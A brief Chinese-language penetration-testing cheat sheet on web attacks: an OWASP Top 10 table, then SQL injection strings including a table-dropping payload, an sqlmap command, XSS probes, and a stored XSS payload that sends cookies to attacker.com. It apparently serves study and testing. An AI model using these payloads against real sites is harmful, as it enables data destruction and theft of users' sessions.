# Web 攻击

## OWASP Top 10

| 风险 | 说明 |
|:---|:---|
| A01 访问控制崩溃 | 越权访问 |
| A02 加密失败 | 明文传输/弱加密 |
| A03 注入 | SQL/命令/模板注入 |
| A04 不安全设计 | 架构缺陷 |
| A05 安全配置错误 | 默认密码/目录列表 |
| A06 易受攻击组件 | 旧版本/漏洞组件 |
| A07 认证失败 | 弱密码/会话固定 |
| A08 数据完整性失败 | 反序列化 |
| A09 日志和监控不足 | 无法检测攻击 |
| A10 SSRF | 服务端请求伪造 |

## SQL 注入

```bash
# 手工测试
' OR '1'='1
' UNION SELECT 1,2,3 --
'; DROP TABLE users; --

# SQLMap
sqlmap -u "http://target.com/page?id=1" --batch --risk=3 --level=5
```

## XSS

```html
<!-- 反射型 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>

<!-- 存储型 -->
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

## Burp Suite

Burp Suite 是 Web 渗透的核心工具，支持代理拦截、重放、扫描、模糊测试。
